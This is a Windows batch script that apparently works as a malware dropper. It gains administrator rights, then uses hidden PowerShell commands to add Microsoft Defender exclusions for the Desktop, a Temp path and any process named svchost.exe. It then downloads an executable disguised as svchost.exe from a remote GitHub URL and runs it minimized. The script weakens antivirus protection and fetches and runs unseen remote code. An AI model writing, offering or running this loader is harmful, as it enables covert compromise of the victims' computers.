@echo off
setlocal enabledelayedexpansion

:: Check if running as administrator
openfiles > nul 2>&1
if %errorlevel%==0 (
    goto :run_script
) else (
    powershell -Command "Start-Process -FilePath '%~dp0%~nx0' -Verb RunAs"
    exit
)

:run_script
:: Add Defender exclusions
powershell -WindowStyle Hidden -Command "
    Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Temp' -ErrorAction SilentlyContinue;
    Add-MpPreference -ExclusionPath 'C:\Users\%username%\AppData\Roaming\Temp\svchost.exe' -ErrorAction SilentlyContinue;
    Add-MpPreference -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue;
    Add-MpPreference -ExclusionPath 'C:\Users\%username%\Desktop' -ErrorAction SilentlyContinue
"

:: Download svchost.exe from the specified URL
powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/bouncegame/svchost/raw/refs/heads/main/svchost.exe', '%USERPROFILE%\Desktop\svchost.exe')"

:: Run svchost.exe silently
start "" /min "%USERPROFILE%\Desktop\svchost.exe"

:: Clean up (optional)
:: del /q /f "%USERPROFILE%\Desktop\svchost.exe"
